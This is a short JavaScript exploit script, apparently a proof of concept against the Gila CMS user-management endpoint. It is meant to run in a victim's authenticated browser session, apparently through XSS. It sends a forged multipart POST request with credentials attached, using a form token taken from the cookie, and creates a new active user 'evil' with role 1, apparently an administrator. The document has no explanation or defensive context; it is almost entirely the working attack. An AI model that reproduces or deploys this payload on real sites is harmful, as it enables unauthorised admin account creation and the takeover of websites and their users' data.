xhr = function(){
  /*AJAX*/
  var request = false;
  if(window.XMLHttpRequest) {
    request = new XMLHttpRequest();
  } else if(window.ActiveXObject) {
    try {
      request = new window.ActiveXObject('Microsoft.XMLHTTP');
    } catch(e) {}
  }
  return request;
}();

request = function(method,src,argv,content_type){
  xhr.open(method,src,false);
  // Get the latest Cookie from XSS.
  xhr.withCredentials = true;
  if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);
  xhr.send(argv);
  return xhr.responseText;
}

attack_a = function(){
  var src = "http://mycms.com/gila/cm/update_rows/user";
  // Get formToken from XSS's Cookie
  var formToken = "1tzu34209ugf2wd";
  var photo = "";
  var username = "evil";
  var email = "email@mycms.com";
  var pass = "evilpass";
  var userrole = "1";
  var active = "1";
  var argv_0 = "\r\n";
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"formToken\"\r\n\r\n";
  argv_0 += (formToken+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"photo\"\r\n\r\n";
  argv_0 += (photo+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n";
  argv_0 += (username+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n";
  argv_0 += (email+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"pass\"\r\n\r\n";
  argv_0 += (pass+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"userrole[]\"\r\n\r\n";
  argv_0 += (userrole+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition: form-data; name=\"active\"\r\n\r\n";
  argv_0 += (active+"\r\n");
  argv_0 += "---------------------7964f8dddeb95fc5--\r\n";
  request("POST",src,argv_0,"multipart/form-data; boundary=-------------------7964f8dddeb95fc5");
}

attack_a();